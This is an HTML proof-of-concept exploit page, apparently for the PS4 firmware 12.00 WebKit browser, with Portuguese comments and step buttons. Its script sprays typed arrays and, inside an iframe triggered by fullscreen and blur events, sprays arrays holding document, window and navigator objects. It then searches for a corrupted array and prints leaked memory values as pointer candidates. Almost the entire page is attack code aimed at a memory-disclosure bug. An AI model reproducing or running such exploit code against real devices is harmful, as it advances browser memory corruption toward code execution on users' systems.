<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Butterfly Overlap - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - InfoLeak (Butterfly)</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (Butterfly Spray)</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Memory Dump</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; line-height: 1.6;"></div>

    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                // A sua base de ouro (Tamanho 8)
                let arr = new Float64Array(8);
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos prontos.";
            statusPai.style.color = "blue";
            leakOutput.style.display = "none";
        }

        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html>
                <body>
                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                    <script>
                        window.startPoC = function() {
                            if (document.documentElement.webkitRequestFullscreen) 
                                document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                
                                for(let i = 0; i < 8000; i++) {
                                    // A MÁGICA AQUI: Usamos JS Array normal em vez de Float64Array
                                    // O índice 0 é o PATTERN para disparar a detecção.
                                    // Os índices seguintes são OBJETOS REAIS do sistema!
                                    let mixArray = [
                                        ${PATTERN}, 
                                        document,       // Ponteiro do DOM
                                        window,         // Ponteiro Global
                                        navigator,      // Ponteiro de sistema
                                        new Uint32Array(1), // Objeto tipado
                                        i, i, i         // Preenchimento numérico
                                    ];
                                    spray.push(mixArray);
                                }
                                
                                // O seu timing exato de sucesso
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>FINALIZADO</h1>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body>
                </html>
            `);
            fDoc.close();
            statusPai.innerText = "Iframe Pronto. Sequência: FS -> OPTIONS.";
        }

        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ BINGO! ID " + corruptedIndex + " corrompido!</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ MEMORY DUMP - BUSCA DE PONTEIROS ]</b><br><br>";

                for(let i = 0; i < 8; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    // Lógica para destacar ponteiros:
                    // No WebKit, ponteiros de objetos frequentemente começam com algo como 0x0000... e não são zeros absolutos.
                    let isPointer = (hex !== "0000000000000000" && !hex.includes("41414141"));
                    let style = isPointer ? "color:#fff; background:#d32f2f; padding:2px; font-weight:bold;" : "";
                    
                    let label = "";
                    if (i === 0) label = " (Pattern)";
                    else if (i === 1) label = " (Possível 'document')";
                    else if (i === 2) label = " (Possível 'window')";
                    
                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span>" + label + "<br>";
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Tente novamente.</span>";
            }
        }
    </script>
</body>
</html>
